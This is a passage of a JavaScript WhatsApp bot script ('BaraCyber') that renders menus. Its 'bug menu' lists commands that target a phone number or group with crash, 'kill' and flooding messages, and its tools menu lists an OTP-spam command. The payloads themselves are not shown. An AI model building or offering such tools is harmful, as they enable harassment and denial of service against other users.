*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: aimenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'storemenu': {
await loading()
const storemenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ────────𖣘───────── ✞
  ┆ </> \`[ STORE ]\` </>
✞ ────────𖣘───────── ✞

╭┈──────────────────𖣘
│  ◦  .ᴘᴀʏᴍᴇɴᴛ 
│  ◦  .ᴅᴀɴᴀᴍᴀsᴜᴋ
│  ◦  .ᴘʀᴏsᴇs
│  ◦  .ᴅᴏɴᴇ
╰┈────────────────𖣘

✞ ────────𖣘───────── ✞
  ┆ </> \`[ JPM PRO ]\` </>
✞ ────────𖣘───────── ✞

╭┈──────────────────𖣘
│  ◦  .ᴊᴘᴍᴘʀᴏᴍᴏsɪ 
│  ◦  .ᴊᴘᴍ3
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: storemenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'panelmenu': {
await loading()
const panelmenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ PTREODA ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .1ɢʙ
│  ◦  .2ɢʙ
│  ◦  .3ɢʙ
│  ◦  .4ɢʙ
│  ◦  .5ɢʙ
│  ◦  .6ɢʙ
│  ◦  .7ɢʙ
│  ◦  .8ɢʙ
│  ◦  .9ɢʙ
│  ◦  .ᴜɴʟɪ
│  ◦  .ʟɪsᴛsʀᴠ
│  ◦  .ᴅᴇʟsʀᴠ
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: panelmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'bugmenu': {
await loading()
const bugmenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ IN PLACE ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .sᴠʙ_ᴄᴜᴋ
│  ◦  .ʙᴀʀᴀ_ᴄɪᴘᴏᴋ
│  ◦  .ᴀɪɴɢ_ʙᴇʀᴅᴜᴋᴀ
│  ◦  .ʜᴀʟᴏ
│  ◦  .sᴀʏᴀɴɢ
│  ◦  .ᴛᴇs
│  ◦  .ᴛᴜʀᴜ_ᴅᴇᴋ
│  ◦  .bara_cyber
│  ◦  .ʜᴇᴠ
╰┈────────────────𖣘

✞ ───────────────── ✞
  ┆ </> \`[ V5 GEN 4 ]\` </>
✞ ───────────────── ✞

╭┈──────────────────𖣘
│  ◦  .xbara <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ V5 GEN 4 ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .xᴘᴀʏᴍᴇɴᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .xʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ
│  ◦  .ᴏɴᴇ-sʜᴏᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴏɴᴇ-ᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴅᴏᴜʙʟᴇᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴛʀɪᴘᴇxᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴍᴀɴɪᴀᴄx <ɴᴜᴍʙᴇʀ>
│  ◦  .sᴀᴠᴀɢᴇx <ɴᴜᴍʙᴇʀ>
│  ◦  .xɪᴏs <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ───────────────── ✞
  ┆ </> \`[ BUG SKIBIDI ]\` </>
✞ ───────────────── ✞

╭┈──────────────────𖣘
│  ◦  .sᴋɪʙɪᴅɪ_ɢʏᴀᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .sᴋɪʙɪᴅɪ_sɪɢᴍᴀ <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ────────𖣘───────── ✞
  ┆ </> \`[ BUG VIDEO ]\` </>
✞ ────────𖣘─────────✞

╭┈──────────────────𖣘
│  ◦  .ʙᴜɢᴠɪᴅ1 <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ BUG EMOJI ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .🔥 <ɴᴜᴍʙᴇʀ>
│  ◦  .🌹 <ɴᴜᴍʙᴇʀ>
│  ◦  .🌷 <ɴᴜᴍʙᴇʀ>
│  ◦  .⭐ <ɴᴜᴍʙᴇʀ>
│  ◦  .⚡ <ɴᴜᴍʙᴇʀ>
│  ◦  .💥 <ɴᴜᴍʙᴇʀ>
│  ◦  .💀 <ɴᴜᴍʙᴇʀ>
│  ◦  .🗿 <ɴᴜᴍʙᴇʀ>
│  ◦  .😈 <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ BUG UI  ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────
│  ◦  .ʙᴀʀᴀ-ᴜɪ <ɴᴜᴍʙᴇʀ>
│  ◦  .ʙᴀʀᴀ-ᴜɴʟɪᴍɪᴛᴇᴅ <ɴᴜᴍʙᴇʀ>
│  ◦  .ʙᴀʀᴀ-ɪɴғɪɴɪᴛʏ <ɴᴜᴍʙᴇʀ>
│  ◦  .ʙᴀʀᴀ-ᴜɪᴄʀᴀsʜ <ɴᴜᴍʙᴇʀ>
╰┈────────────────•

✞ ────────𖣘───────── ✞
  ┆ </> \`[ BUG WAR ]\` </>
✞ ────────𖣘───────── ✞

╭┈──────────────────𖣘
│  ◦  .sɪɴɪ_ᴡᴀʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ɢᴜᴀ_ʙᴀᴄᴏᴋ_ʟᴜ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴀᴜᴀʜ_ɴɢᴀɴᴛᴜᴋ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴄᴇɴᴛᴀɴɢ_sᴀᴛᴜ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ʙᴀɴᴛᴀɪ_ʀɪᴘᴇʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴀɴᴊᴀʏ_ᴀʟᴏᴋ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴛᴇʟᴏʟᴇᴛ_ᴘʟᴇʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ BUG GROUP ]\` </>
✞ ────────𖣘───────── ✞

╭┈──────────────────
│  ◦  .ʙᴜɢ-ʙᴜᴛᴛᴏɴ <ʟɪɴᴋ>
│  ◦  .ʙᴜɢ-sɪᴛᴇxʏᴢ <ʟɪɴᴋ>
│  ◦  .ʙᴜᴛᴛᴏɴ-ɪɴᴛᴇʀɴᴀʟ <ʟɪɴᴋ>
│  ◦  .ʙᴜᴛᴛᴏɴ-ᴇxᴛᴇʀɴᴀʟ <ʟɪɴᴋ>
│  ◦  .ʙᴜɢ-ʜᴏʟᴇ <120###@g.ᴜs>
│  ◦  .ᴇɴᴇᴍʏɢʀᴏᴜᴘ <120###@g.ᴜs>
│  ◦  .ᴇxᴛᴇʀɴᴀʟ-ɢʀᴏᴜᴘ <120###@g.ᴜs>
╰┈────────────────•

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'toolsmenu': {
await loading()
const toolsmenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ ENCRYPT ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ᴇɴᴄ <ᴄᴏᴅᴇ>
│  ◦  .ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ SPAM CODE ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ʟᴏᴄᴋᴏᴛᴘ <ᴊᴜᴍʟᴀʜ|ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'groupmenu': {
await loading()
const groupmenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ GROUP MENU ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│  ◦  .ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
│  ◦  .ᴋɪᴄᴋ <ᴛᴀɢ>
│  ◦  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
│  ◦  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
